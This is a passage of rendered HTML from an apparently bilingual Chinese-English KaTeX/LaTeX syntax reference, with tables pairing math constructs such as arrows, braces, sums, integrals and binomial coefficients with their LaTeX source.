style="height:3em;"></span><span class="accent-body" style="left:-0.17994em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 53.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 1110.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359c-16-25.333-24-45-24-59z'/></svg></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:left">\hat a \ \bar b \ \vec c</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mrow><mi>a</mi><mi>b</mi></mrow><mo stretchy="true">→</mo></mover><mtext> </mtext><mover accent="true"><mrow><mi>c</mi><mi>d</mi></mrow><mo stretchy="true">←</mo></mover><mtext> </mtext><mover accent="true"><mrow><mi>d</mi><mi>e</mi><mi>f</mi></mrow><mo stretchy="true">^</mo></mover></mrow><annotation encoding="application/x-tex">\overrightarrow{a b} \ \overleftarrow{c d} \ \widehat{d e f}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.41088em;vertical-align:-0.19444em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.21644em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mord mathnormal">b</span></span></span><span class="svg-align" style="top:-3.69444em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="height:0.522em;min-width:0.888em;"><svg width='400em' height='0.522em' viewBox='0 0 400000 522' preserveAspectRatio='xMaxYMin slice'><path d='M0 241v40h399891c-47.3 35.3-84 78-110 128-16.7 32-27.7 63.7-33 95 0 1.3-.2 2.7-.5 4-.3 1.3-.5 2.3-.5 3 0 7.3 6.7 11 20 11 8 0 13.2-.8 15.5-2.5 2.3-1.7 4.2-5.5 5.5-11.5 2-13.3 5.7-27 11-41 14.7-44.7 39-84.5 73-119.5s73.7-60.2 119-75.5c6-2 9-5.7 9-11s-3-9-9-11c-45.3-15.3-85-40.5-119-75.5s-58.3-74.8-73-119.5c-4.7-14-8.3-27.3-11-40-1.3-6.7-3.2-10.8-5.5-12.5-2.3-1.7-7.5-2.5-15.5-2.5-14 0-21 3.7-21 11 0 2 2 10.3 6 25 20.7 83.3 67 151.7 139 205zm0 0v40h399900v-40z'/></svg></span></span></span></span></span></span><span class="mspace"> </span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.21644em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span></span></span><span class="svg-align" style="top:-3.69444em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="height:0.522em;min-width:0.888em;"><svg width='400em' height='0.522em' viewBox='0 0 400000 522' preserveAspectRatio='xMinYMin slice'><path d='M400000 241H110l3-3c68.7-52.7 113.7-120 135-202 4-14.7 6-23 6-25 0-7.3-7-11-21-11-8 0-13.2.8-15.5 2.5-2.3 1.7-4.2 5.8-5.5 12.5-1.3 4.7-2.7 10.3-4 17-12 48.7-34.8 92-68.5 130S65.3 228.3 18 247c-10 4-16 7.7-18 11 0 8.7 6 14.3 18 17 47.3 18.7 87.8 47 121.5 85S196 441.3 208 490c.7 2 1.3 5 2 9s1.2 6.7 1.5 8c.3 1.3 1 3.3 2 6s2.2 4.5 3.5 5.5c1.3 1 3.3 1.8 6 2.5s6 1 10 1c14 0 21-3.7 21-11 0-2-2-10.3-6-25-20-79.3-65-146.7-135-202 l-3-3h399890zM100 241v40h399900v-40z'/></svg></span></span></span></span></span></span><span class="mspace"> </span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.99444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span><span class="svg-align" style="top:-3.69444em;"><span class="pstrut" style="height:3em;"></span><span style="height:0.3em;"><svg width='100%' height='0.3em' viewBox='0 0 2364 300' preserveAspectRatio='none'><path d='M1181 0h2l1171 176c6 0 10 5 10 11l-2 23c-1 6-5 10-11 10h-1L1182 67 15 220h-1c-6 0-10-4-11-10l-2-23c-1-6 4-11 10-11z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span></span></span></span></td><td style="text-align:left">\overrightarrow{a b} \ \overleftarrow{c d} \ \widehat{d e f}</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mrow><mi>g</mi><mi>h</mi><mi>i</mi></mrow><mo stretchy="true">‾</mo></mover><mtext> </mtext><munder accentunder="true"><mrow><mi>j</mi><mi>k</mi><mi>l</mi></mrow><mo stretchy="true">‾</mo></munder></mrow><annotation encoding="application/x-tex">\overline{g h i} \ \underline{j k l}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.28888em;vertical-align:-0.39444em;"></span><span class="mord overline"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.89444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span></span></span><span style="top:-3.81444em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="mspace"> </span><span class="mord underline"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944399999999998em;"><span style="top:-2.64556em;"><span class="pstrut" style="height:3em;"></span><span class="underline-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.39444em;"><span></span></span></span></span></span></span></span></span></td><td style="text-align:left">\overline{g h i} \ \underline{j k l}</td><td style="text-align:left"></td></tr><tr><td style="text-align:left">弧度 Arc (workaround)</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi><mover><mo><mi>A</mi><mi>B</mi></mo><mo lspace="0em" rspace="0em">⌢</mo></mover></mi></mrow><annotation encoding="application/x-tex">\overset{\frown} {AB}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.233678em;vertical-align:0em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.233678em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span><span style="top:-3.88333em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mrel mtight">⌢</span></span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:left">\overset{\frown} {AB}</td></tr><tr><td style="text-align:left">箭头 Arrows</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mover><mo stretchy="true">←</mo><mpadded width="+0.6em" lspace="0.3em"><mrow><mi>n</mi><mo>+</mo><mi>μ</mi><mo>−</mo><mn>1</mn></mrow></mpadded></mover><mi>B</mi><munderover><mo stretchy="true">→</mo><mpadded width="+0.6em" lspace="0.3em"><mi>T</mi></mpadded><mpadded width="+0.6em" lspace="0.3em"><mrow><mi>n</mi><mo>±</mo><mi>i</mi><mo>−</mo><mn>1</mn></mrow></mpadded></munderover><mi>C</mi></mrow><annotation encoding="application/x-tex">A \xleftarrow{n+\mu-1} B \xrightarrow[T]{n\pm i-1} C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.084108em;vertical-align:-0.01100000000000012em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel x-arrow"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.073108em;"><span style="top:-3.322em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight x-arrow-pad"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight">μ</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span class="svg-align" style="top:-2.689em;"><span class="pstrut" style="height:2.7em;"></span><span class="hide-tail" style="height:0.522em;min-width:1.469em;"><svg width='400em' height='0.522em' viewBox='0 0 400000 522' preserveAspectRatio='xMinYMin slice'><path d='M400000 241H110l3-3c68.7-52.7 113.7-120 135-202 4-14.7 6-23 6-25 0-7.3-7-11-21-11-8 0-13.2.8-15.5 2.5-2.3 1.7-4.2 5.8-5.5 12.5-1.3 4.7-2.7 10.3-4 17-12 48.7-34.8 92-68.5 130S65.3 228.3 18 247c-10 4-16 7.7-18 11 0 8.7 6 14.3 18 17 47.3 18.7 87.8 47 121.5 85S196 441.3 208 490c.7 2 1.3 5 2 9s1.2 6.7 1.5 8c.3 1.3 1 3.3 2 6s2.2 4.5 3.5 5.5c1.3 1 3.3 1.8 6 2.5s6 1 10 1c14 0 21-3.7 21-11 0-2-2-10.3-6-25-20-79.3-65-146.7-135-202 l-3-3h399890zM100 241v40h399900v-40z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.01100000000000012em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.6839949999999997em;vertical-align:-0.6003309999999997em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel x-arrow"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.083664em;"><span style="top:-3.322em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight x-arrow-pad"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">±</span><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span class="svg-align" style="top:-2.689em;"><span class="pstrut" style="height:2.7em;"></span><span class="hide-tail" style="height:0.522em;min-width:1.469em;"><svg width='400em' height='0.522em' viewBox='0 0 400000 522' preserveAspectRatio='xMaxYMin slice'><path d='M0 241v40h399891c-47.3 35.3-84 78-110 128-16.7 32-27.7 63.7-33 95 0 1.3-.2 2.7-.5 4-.3 1.3-.5 2.3-.5 3 0 7.3 6.7 11 20 11 8 0 13.2-.8 15.5-2.5 2.3-1.7 4.2-5.5 5.5-11.5 2-13.3 5.7-27 11-41 14.7-44.7 39-84.5 73-119.5s73.7-60.2 119-75.5c6-2 9-5.7 9-11s-3-9-9-11c-45.3-15.3-85-40.5-119-75.5s-58.3-74.8-73-119.5c-4.7-14-8.3-27.3-11-40-1.3-6.7-3.2-10.8-5.5-12.5-2.3-1.7-7.5-2.5-15.5-2.5-14 0-21 3.7-21 11 0 2 2 10.3 6 25 20.7 83.3 67 151.7 139 205zm0 0v40h399900v-40z'/></svg></span></span><span style="top:-2.0996690000000005em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight x-arrow-pad"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.6003309999999997em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span></td><td style="text-align:left">A \xleftarrow{n+\mu-1} B \xrightarrow[T]{n\pm i-1} C</td></tr><tr><td style="text-align:left">大括号 Overbraces</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover><mover><mrow><mn>1</mn><mo>+</mo><mn>2</mn><mo>+</mo><mo>⋯</mo><mo>+</mo><mn>100</mn></mrow><mo stretchy="true">⏞</mo></mover><mn>5050</mn></mover></mrow><annotation encoding="application/x-tex">\overbrace{ 1+2+\cdots+100 }^{5050}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.026878em;vertical-align:-0.08333em;"></span><span class="mord mover"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.9435479999999998em;"><span style="top:-3.29244em;"><span class="pstrut" style="height:3.29244em;"></span><span class="mord mover"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.29244em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span></span></span><span class="svg-align" style="top:-3.74444em;"><span class="pstrut" style="height:3em;"></span><span class="stretchy" style="height:0.548em;min-width:1.6em;"><span class="brace-left" style="height:0.548em;"><svg width='400em' height='0.548em' viewBox='0 0 400000 548' preserveAspectRatio='xMinYMin slice'><path d='M6 548l-6-6v-35l6-11c56-104 135.3-181.3 238-232 57.3-28.7 117-45 179-50h399577v120H403c-43.3 7-81 15-113 26-100.7 33-179.7 91-237 174-2.7 5-6 9-10 13-.7 1-7.3 1-20 1H6z'/></svg></span><span class="brace-center" style="height:0.548em;"><svg width='400em' height='0.548em' viewBox='0 0 400000 548' preserveAspectRatio='xMidYMin slice'><path d='M200428 334c-100.7-8.3-195.3-44-280-108-55.3-42-101.7-93-139-153l-9-14c-2.7 4-5.7 8.7-9 14-53.3 86.7-123.7 153-211 199-66.7 36-137.3 56.3-212 62H0V214h199568c178.3-11.7 311.7-78.3 403-201 6-8 9.7-12 11-12 .7-.7 6.7-1 18-1s17.3.3 18 1c1.3 0 5 4 11 12 44.7 59.3 101.3 106.3 170 141s145.3 54.3 229 60h199572v120z'/></svg></span><span class="brace-right" style="height:0.548em;"><svg width='400em' height='0.548em' viewBox='0 0 400000 548' preserveAspectRatio='xMaxYMin slice'><path d='M400000 542l-6 6h-17c-12.7 0-19.3-.3-20-1-4-4-7.3-8.3-10-13-35.3-51.3-80.8-93.8-136.5-127.5s-117.2-55.8-184.5-66.5c-.7 0-2-.3-4-1-18.7-2.7-76-4.3-172-5H0V214h399571l6 1c124.7 8 235 61.7 331 161 31.3 33.3 59.7 72.7 85 118l7 13v35z'/></svg></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.08333em;"><span></span></span></span></span></span></span><span style="top:-4.78488em;"><span class="pstrut" style="height:3.29244em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span><span class="mord mtight">0</span><span class="mord mtight">5</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.08333em;"><span></span></span></span></span></span></span></span></span></td><td style="text-align:left">\overbrace{ 1+2+\cdots+100 }^{5050}</td></tr><tr><td style="text-align:left">底部大括号 Underbraces</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><munder><munder><mrow><mi>a</mi><mo>+</mo><mi>b</mi><mo>+</mo><mo>⋯</mo><mo>+</mo><mi>z</mi></mrow><mo stretchy="true">⏟</mo></munder><mn>26</mn></munder></mrow><annotation encoding="application/x-tex">\underbrace{ a+b+\cdots+z }_{26}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.076878em;vertical-align:-1.382438em;"></span><span class="mord munder"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-1.617562em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord munder"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span class="svg-align" style="top:-2.26867em;"><span class="pstrut" style="height:3em;"></span><span class="stretchy" style="height:0.548em;min-width:1.6em;"><span class="brace-left" style="height:0.548em;"><svg width='400em' height='0.548em' viewBox='0 0 400000 548' preserveAspectRatio='xMinYMin slice'><path d='M0 6l6-6h17c12.688 0 19.313.3 20 1 4 4 7.313 8.3 10 13 35.313 51.3 80.813 93.8 136.5 127.5 55.688 33.7 117.188 55.8 184.5 66.5.688 0 2 .3 4 1 18.688 2.7 76 4.3 172 5h399450v120H429l-6-1c-124.688-8-235-61.7-331-161C60.687 138.7 32.312 99.3 7 54L0 41V6z'/></svg></span><span class="brace-center" style="height:0.548em;"><svg width='400em' height='0.548em' viewBox='0 0 400000 548' preserveAspectRatio='xMidYMin slice'><path d='M199572 214c100.7 8.3 195.3 44 280 108 55.3 42 101.7 93 139 153l9 14c2.7-4 5.7-8.7 9-14 53.3-86.7 123.7-153 211-199 66.7-36 137.3-56.3 212-62h199568v120H200432c-178.3 11.7-311.7 78.3-403 201-6 8-9.7 12-11 12-.7.7-6.7 1-18 1s-17.3-.3-18-1c-1.3 0-5-4-11-12-44.7-59.3-101.3-106.3-170-141s-145.3-54.3-229-60H0V214z'/></svg></span><span class="brace-right" style="height:0.548em;"><svg width='400em' height='0.548em' viewBox='0 0 400000 548' preserveAspectRatio='xMaxYMin slice'><path d='M399994 0l6 6v35l-6 11c-56 104-135.3 181.3-238 232-57.3 28.7-117 45-179 50H-300V214h399897c43.3-7 81-15 113-26 100.7-33 179.7-91 237-174 2.7-5 6-9 10-13 .7-1 7.3-1 20-1h17z'/></svg></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.73133em;"><span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.382438em;"><span></span></span></span></span></span></span></span></span></td><td style="text-align:left">\underbrace{ a+b+\cdots+z }_{26}</td></tr><tr><td style="text-align:left">求和运算 Sum</td><td style="text-align:left">$$\sum_{k=1}^N k^2$$</td><td style="text-align:left">\sum_{k=1}^N k^2</td></tr><tr><td style="text-align:left">文本模式下的求和运算 Sum (force \textstyle)</td><td style="text-align:left">$$\textstyle \sum_{k=1}^N k^2$$</td><td style="text-align:left">\textstyle \sum_{k=1}^N k^2</td></tr><tr><td style="text-align:left">分式中的求和运算 Sum in a fraction (default \textstyle)</td><td style="text-align:left">$$\frac{\sum_{k=1}^N k^2}{a}$$</td><td style="text-align:left">\frac{\sum_{k=1}^N k^2}{a}</td></tr><tr><td style="text-align:left">分式中的求和运算 Sum in a fraction (force \displaystyle)</td><td style="text-align:left">$$\frac{\displaystyle \sum_{k=1}^N k^2}{a}$$</td><td style="text-align:left">\frac{\displaystyle \sum_{k=1}^N k^2}{a}</td></tr><tr><td style="text-align:left">分式中的求和运算 Sum in a fraction (alternative limits style)</td><td style="text-align:left">$$\frac{\sum\limits<sup>{</sup>N}_{k=1} k^2}{a}$$</td><td style="text-align:left">\frac{\sum\limits<sup>{</sup>N}_{k=1} k^2}{a}</td></tr><tr><td style="text-align:left">乘积运算 Product</td><td style="text-align:left">$$\prod_{i=1}^N x_i$$</td><td style="text-align:left">\prod_{i=1}^N x_i</td></tr><tr><td style="text-align:left">乘积运算 Product (force \textstyle)</td><td style="text-align:left">$$\textstyle \prod_{i=1}^N x_i$$</td><td style="text-align:left">\textstyle \prod_{i=1}^N x_i</td></tr><tr><td style="text-align:left">副乘运算 Coproduct</td><td style="text-align:left">$$\coprod_{i=1}^N x_i$$</td><td style="text-align:left">\coprod_{i=1}^N x_i</td></tr><tr><td style="text-align:left">副乘运算 Coproduct (force \textstyle)</td><td style="text-align:left">$$\textstyle \coprod_{i=1}^N x_i$$</td><td style="text-align:left">\textstyle \coprod_{i=1}^N x_i</td></tr><tr><td style="text-align:left">极限 Limit</td><td style="text-align:left">$$\lim_{n \to \infty}x_n$$</td><td style="text-align:left">\lim_{n \to \infty}x_n</td></tr><tr><td style="text-align:left">极限 Limit (force \textstyle)</td><td style="text-align:left">$$\textstyle \lim_{n \to \infty}x_n$$</td><td style="text-align:left">\textstyle \lim_{n \to \infty}x_n</td></tr><tr><td style="text-align:left">积分 Integral</td><td style="text-align:left">$$\int\limits_{1}<sup>{3}\frac{e</sup>3/x}{x^2}, dx$$</td><td style="text-align:left">\int\limits_{1}<sup>{3}\frac{e</sup>3/x}{x^2}, dx</td></tr><tr><td style="text-align:left">积分 Integral (alternative limits style)</td><td style="text-align:left">$$\int_{1}<sup>{3}\frac{e</sup>3/x}{x^2}, dx$$</td><td style="text-align:left">\int_{1}<sup>{3}\frac{e</sup>3/x}{x^2}, dx</td></tr><tr><td style="text-align:left">积分 Integral (force \textstyle)</td><td style="text-align:left">$$\textstyle \int\limits_{-N}^{N} e^x dx$$</td><td style="text-align:left">\textstyle \int\limits_{-N}^{N} e^x dx</td></tr><tr><td style="text-align:left">积分 Integral (force \textstyle, alternative limits style)</td><td style="text-align:left">$$\textstyle \int_{-N}^{N} e^x dx$$</td><td style="text-align:left">\textstyle \int_{-N}^{N} e^x dx</td></tr><tr><td style="text-align:left">双重积分 Double integral</td><td style="text-align:left">$$\iint\limits_D dx,dy$$</td><td style="text-align:left">\iint\limits_D dx,dy</td></tr><tr><td style="text-align:left">三重积分 Triple integral</td><td style="text-align:left">$$\iiint\limits_E dx,dy,dz$$</td><td style="text-align:left">\iiint\limits_E dx,dy,dz</td></tr><tr><td style="text-align:left">四重积分 Quadruple integral</td><td style="text-align:left">$$\iiiint\limits_F dx,dy,dz,dt$$</td><td style="text-align:left">\iiiint\limits_F dx,dy,dz,dt</td></tr><tr><td style="text-align:left">路径积分 Line or path integral</td><td style="text-align:left">$$\int_{(x,y)\in C} x^3, dx + 4y^2, dy$$</td><td style="text-align:left">\int_{(x,y)\in C} x^3, dx + 4y^2, dy</td></tr><tr><td style="text-align:left">环路积分 Closed line or path integral</td><td style="text-align:left">$$\oint_{(x,y)\in C} x^3, dx + 4y^2, dy$$</td><td style="text-align:left">\oint_{(x,y)\in C} x^3, dx + 4y^2, dy</td></tr><tr><td style="text-align:left">交集 Intersections</td><td style="text-align:left">$$\bigcap_{i=1}^n E_i$$</td><td style="text-align:left">\bigcap_{i=1}^n E_i</td></tr><tr><td style="text-align:left">并集 Unions</td><td style="text-align:left">$$\bigcup_{i=1}^n E_i$$</td><td style="text-align:left">\bigcup_{i=1}^n E_i</td></tr></tbody></table><h2 id="24-矩阵与多行列式-matrices-multilines"><a class="markdownIt-Anchor" href="#24-矩阵与多行列式-matrices-multilines"></a> 2.4 矩阵与多行列式 Matrices &amp; Multilines</h2><table><thead><tr><th style="text-align:left">类型</th><th style="text-align:left">样式</th><th style="text-align:left">LaTeX</th></tr></thead><tbody><tr><td style="text-align:left">二项式系数<br/>Binomial coefficients</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><mi>n</mi><mi>k</mi></mfrac><mo fence="true">)</mo></mrow><annotation encoding="application/x-tex">\binom{n}{k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="mord"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7453919999999999em;"><span style="top:-2.3550000000000004em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span style="top:-3.144em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span></span></span></span></td><td style="text-align:left">\binom{n}{k}</td></tr><tr><td style="text-align:left">小型二项式系数<br/>Small binomial coefficients (force \textstyle)</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><mi>n</mi><mi>k</mi></mfrac><mo fence="true">)</mo></mrow><annotation encoding="application/x-tex">\tbinom{n}{k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="mord"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7453919999999999em;"><span style="top:-2.3550000000000004em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span style="top:-3.144em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span></span></span></span></td><td style="text-align:left">\tbinom{n}{k}</td></tr><tr><td style="text-align:left">大型二项式系数<br/>Large (normal) binomial coefficients (force \displaystyle)</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">(</mo><mstyle displaystyle="true" scriptlevel="0"><mfrac linethickness="0px"><mi>n</mi><mi>k</mi></mfrac></mstyle><mo fence="true">)</mo></mrow><annotation encoding="application/x-tex">\dbinom{n}{k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="mord"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1075599999999999em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span></span></span></span></td><td style="text-align:left">\dbinom{n}{k}</td></tr><tr><td style="text-align:left">矩阵<br/>Matrices</td><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>x</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>y</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>z</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" 